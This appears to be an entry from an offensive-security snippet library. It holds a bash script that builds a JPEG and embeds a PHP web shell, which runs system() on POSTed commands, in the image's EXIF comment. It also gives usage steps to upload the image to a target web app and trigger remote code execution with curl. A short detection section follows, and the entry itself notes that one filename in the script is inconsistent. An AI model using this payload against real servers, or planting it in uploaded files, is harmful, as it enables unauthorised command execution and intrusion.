---
id: 756635da-fd7f-4f42-b0e2-bfca0f6c1086
name: bash-create-php-payload-image
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:41.078468+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload
  - php-injection
  - rce
validated: true
---

# bash-create-php-payload-image

## Code

```bash
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

## Description

This bash script creates a white JPEG image, adds benign metadata, and embeds a PHP command injection payload into the EXIF Comment field. The payload allows RCE by executing system commands from POST data when the image is requested on a vulnerable PHP server. Note: The final command targets 'img.jpg', which may need adjustment to 'payload.jpg' for consistency.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | The script uses hardcoded values; customize sizes, tags, or filenames manually before running | N/A |

## Usage

Run the script on a Linux system with ImageMagick and ExifTool installed to generate the payload image. Upload the resulting file to a target web app, then trigger via POST: curl -d "cmd=whoami" http://target/uploads/payload.jpg. Ideal for file upload exploitation in red team engagements or pentests.

## Detection

- File analysis tools scanning for executable code in EXIF comments (e.g., via strings or custom scripts).
- Web server logs showing POST requests to image files or anomalous system() executions in PHP error logs.
- Antivirus signatures for known PHP injection patterns in metadata.

## Related

- [[Related Procedure|procedures/Inject-PHP-Code-into-Image-Metadata-for-RCE]]
- [[Related Tool|tools/ImageMagick]]
- [[Related Tool|tools/ExifTool]]
